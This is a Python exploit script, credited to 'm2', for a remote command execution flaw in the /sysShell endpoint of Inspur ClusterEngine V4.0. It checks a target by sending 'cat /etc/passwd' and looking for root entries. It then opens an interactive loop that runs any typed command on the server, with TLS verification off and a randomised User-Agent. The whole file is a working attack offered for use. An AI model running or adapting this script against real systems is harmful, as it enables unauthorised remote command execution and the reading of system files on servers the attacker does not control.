import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import base64
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#poc
def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	vuln_url = url.scheme + '://' + url.netloc + '/sysShell'
	headers = {
		'User-Agent': get_ua(),
		'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
		'Cookie': 'lang=cn'
	}
	data="op=doPlease&node=cu01&command=cat /etc/passwd"
	try:
		res = requests.post(vuln_url,headers=headers,data=data,timeout=10,verify=False)
		if res.status_code==200 and "root:x" in res.text:
			print("\033[32m[+]%s is vuln \033[0m" %vuln_url)
			return 1
		else:
			print("\033[31m[-]%s is not vuln\033[0m" %url1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url1)


def cmdshell(url):
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc
		headers = {
		'User-Agent': get_ua(),
		'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
		'Cookie': 'lang=cn'
		}
		while 1:
			cmd = input("\033[35mCmd: \033[0m")
			if cmd =="exit":
				sys.exit(0)
			else:
				data="op=doPlease&node=cu01&command="+ cmd
				try:
					res = requests.post(url1 + '/sysShell',headers=headers,data=data,timeout=10,verify=False)
					if res.status_code==200:
						poc = re.findall(r'font><br>(.*?)<br>"}', res.text)[0]
						poc = poc.replace('<br>','\n')
						print("\033[32m%s\033[0m" %poc)
					else:
						print("\033[31m[-]%s request flase!\033[0m" %url1)
				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)


if __name__ == '__main__':
	show = r'''

	浪潮ClusterEngineV4.0 sysShell 远程命令执行漏洞exp
	                                                                                          
	                                                                                                                 
                              		 By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='浪潮ClusterEngineV4.0sysShell_rce_exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	# arg.add_argument("-f",
	# 					"--file",
	# 					help="Target URL; Example:url.txt")
	# arg.add_argument("-c",
	# 				"--cmd",
	# 				help="Target URL; Example:http://ip:port")
	args=arg.parse_args()
	url=args.url
	# filename=args.file
	# cmd=args.cmd
	if url != None:
		cmdshell(url)
	else:
		print('请检查参数是否错误!')

